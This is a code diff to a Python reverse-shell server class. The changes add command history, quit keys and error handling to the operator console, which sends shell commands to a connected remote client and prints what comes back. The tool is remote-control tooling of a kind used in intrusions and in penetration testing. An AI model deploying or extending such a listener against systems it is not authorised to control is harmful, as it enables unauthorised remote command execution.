@@ -24,6 +24,7 @@ class ReverseShellServer(object):
         self.host = host
         self.port = port
         self._err_count = 0
+        self.last_command = 'ls'
 
     def socket_create(self):
         try:
@@ -61,6 +62,7 @@ class ReverseShellServer(object):
                 print(ascii_format('Broken pipe, restarting', 93))
             except EOFError:
                 print(ascii_format('EOF/Broken pipe, restarting', 93))
+                self.kill_client()
             finally:
                 print(ascii_format('...', 93))
 
@@ -90,7 +92,13 @@ class ReverseShellServer(object):
         self.sock.close()
 
     def kill_client(self):
-        self.conn.send(SIG_REVERIESH.KILL)
+        try:
+            self.conn.send(SIG_REVERIESH.KILL)
+        except BrokenPipeError:
+            print('Cannot kill client, pipe already broken')
+
+    def restart_client(self):
+        pass
 
     def quit(self, code=0):
         print('quitting')
@@ -117,11 +125,27 @@ class ReverseShellServer(object):
         info = self.unmarshall(data)
         print(info['prompt'].decode(), end='')
 
+    def get_input(self):
+        # todo: use readline instead
+        cmd = input()
+        # print(":".join("{:02x}".format(ord(c)) for c in cmd))
+        if cmd == '\x14':
+            pass # todo: restart call
+        if cmd == '\x19' or cmd == 'quit':
+            print('Asking for SIGQUIT, quitting')
+            self.quit()
+        if cmd == '\x1b[A':
+            # last command
+            print(ascii_format(self.last_command, 'blue'))
+            cmd = self.last_command
+        return cmd
+
     def send_commands(self):
-            cmd = input()
-            if cmd == 'quit':
-                self.quit()
-            if len(str.encode(cmd)) > 0:
+            cmd = self.get_input()
+            if not cmd:
+                self.prompt()
+            elif len(str.encode(cmd)) > 0:
+                self.last_command = cmd
                 self.conn.send(cmd.encode())
                 data = self.conn.recv(1024)
                 info = self.unmarshall(data)
@@ -130,9 +154,9 @@ class ReverseShellServer(object):
                 if info.get('out', None):
                     print(info['out'].decode(), end='')
                 print(info['prompt'].decode(), end='')
-
             else:
-                self.prompt()
+                print('wat')
+
 
 
 
